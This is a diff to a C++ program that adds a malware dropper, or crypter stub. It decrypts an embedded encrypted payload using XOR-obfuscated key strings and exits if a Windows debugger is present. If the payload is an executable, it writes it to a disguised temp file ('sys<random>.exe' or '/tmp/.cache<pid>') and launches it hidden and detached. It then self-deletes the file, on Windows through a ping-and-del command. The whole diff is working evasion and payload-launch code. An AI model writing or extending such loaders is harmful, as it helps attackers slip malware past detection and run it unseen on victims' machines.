@@ -6,6 +6,15 @@
 #include <cstring>
 #include <cstdlib>
 #include <cstdint>
+#include <ctime>
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#endif
 
 // XOR obfuscated strings - impossible to detect
 std::string xIULlJDMMAsWJ() { uint8_t k = 82; uint8_t data[] = {106,54,48,55,107,55,102,48,54,52,49,102,52,55,107,107,97,99,48,49,52,98,52,102,96,55,97,49,100,49,103,98,}; std::string result; for (int i = 0; i < sizeof(data)/sizeof(data[0])-1; i++) result += static_cast<char>(data[i] ^ k); return result; }
@@ -140,25 +149,126 @@ void xKeVfJOPshCue(const std::string& hex, uint8_t* bytes) {
     }
 }
 
+// Embedded encrypted payload (populated by linker)
+extern unsigned char embeddedData[];
+extern size_t embeddedDataSize;
+
 int main() {
+    // Anti-debugging check
+    #ifdef _WIN32
+    if (IsDebuggerPresent()) {
+        return 0;
+    }
+    #endif
+    
     // Get obfuscated key and nonce
     uint8_t key[16], nonce[16];
     xdGvcnvTHsdyv(xoFgmsfFqIOxW(), key);
     xEZRgDsGivHap(xWeLiGdgqljAo(), nonce);
 
-    // Embedded data (will be replaced by linker)
-    uint8_t embeddedData[] = {0x00}; // Placeholder
-    const size_t embeddedDataSize = sizeof(embeddedData);
+    // Allocate buffer for decryption
+    std::vector<uint8_t> decryptedData(embeddedDataSize);
+    std::memcpy(decryptedData.data(), embeddedData, embeddedDataSize);
 
     // Process the data silently
-    xvwRgsmUsWkrm(embeddedData, embeddedData, embeddedDataSize, key, nonce);
+    xvwRgsmUsWkrm(decryptedData.data(), decryptedData.data(), embeddedDataSize, key, nonce);
 
-    // Write processed data to file (completely random filename)
-    std::ofstream outFile("xtiuITjRlRSzj.dat", std::ios::binary);
-    if (outFile.is_open()) {
-        outFile.write(reinterpret_cast<const char*>(embeddedData), embeddedDataSize);
-        outFile.close();
+    // Check if it's an executable
+    bool isExe = (embeddedDataSize > 2 && decryptedData[0] == 'M' && decryptedData[1] == 'Z');
+    
+    if (isExe) {
+        #ifdef _WIN32
+        // Windows in-memory execution
+        void* exec_mem = VirtualAlloc(0, embeddedDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (exec_mem) {
+            std::memcpy(exec_mem, decryptedData.data(), embeddedDataSize);
+            
+            // Make executable
+            DWORD oldProtect;
+            VirtualProtect(exec_mem, embeddedDataSize, PAGE_EXECUTE_READ, &oldProtect);
+            
+            // Try to execute as shellcode first
+            typedef void (*ShellcodeFunc)();
+            ShellcodeFunc shellcode = (ShellcodeFunc)exec_mem;
+            
+            // If not shellcode, write to temp and execute
+            char tempPath[MAX_PATH];
+            GetTempPathA(MAX_PATH, tempPath);
+            
+            // Generate random name
+            std::srand(GetTickCount());
+            std::string exeName = std::string(tempPath) + "sys" + std::to_string(std::rand()) + ".exe";
+            
+            std::ofstream exe(exeName, std::ios::binary);
+            if (exe.is_open()) {
+                exe.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+                exe.close();
+                
+                // Execute silently
+                STARTUPINFOA si = {0};
+                si.cb = sizeof(si);
+                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_HIDE;
+                PROCESS_INFORMATION pi = {0};
+                
+                CreateProcessA(NULL, const_cast<char*>(exeName.c_str()), NULL, NULL, FALSE,
+                              CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
+                
+                if (pi.hProcess) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                }
+                
+                // Self-delete after delay
+                std::string deleteCmd = "cmd /c ping 127.0.0.1 -n 3 > nul & del \"" + exeName + "\"";
+                WinExec(deleteCmd.c_str(), SW_HIDE);
+            }
+            
+            VirtualFree(exec_mem, 0, MEM_RELEASE);
+        }
+        #else
+        // Linux execution
+        std::string tmpName = "/tmp/.cache" + std::to_string(getpid());
+        std::ofstream out(tmpName, std::ios::binary);
+        if (out.is_open()) {
+            out.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+            out.close();
+            chmod(tmpName.c_str(), 0755);
+            
+            // Fork and execute
+            if (fork() == 0) {
+                execl(tmpName.c_str(), tmpName.c_str(), NULL);
+                exit(0);
+            }
+            
+            // Clean up after delay
+            sleep(2);
+            unlink(tmpName.c_str());
+        }
+        #endif
+    } else {
+        // Write non-executable data with random extension
+        const char* extensions[] = {".dat", ".bin", ".tmp", ".cache", ".log"};
+        std::srand(std::time(nullptr));
+        std::string filename = "data" + std::to_string(std::rand()) + extensions[std::rand() % 5];
+        
+        std::ofstream outFile(filename, std::ios::binary);
+        if (outFile.is_open()) {
+            outFile.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
+            outFile.close();
+        }
     }
+
+    // Clear sensitive data from memory
+    #ifdef _WIN32
+    SecureZeroMemory(key, sizeof(key));
+    SecureZeroMemory(nonce, sizeof(nonce));
+    SecureZeroMemory(decryptedData.data(), embeddedDataSize);
+    #else
+    std::memset(key, 0, sizeof(key));
+    std::memset(nonce, 0, sizeof(nonce));
+    std::memset(decryptedData.data(), 0, embeddedDataSize);
+    #endif
 
     return 0;
 }
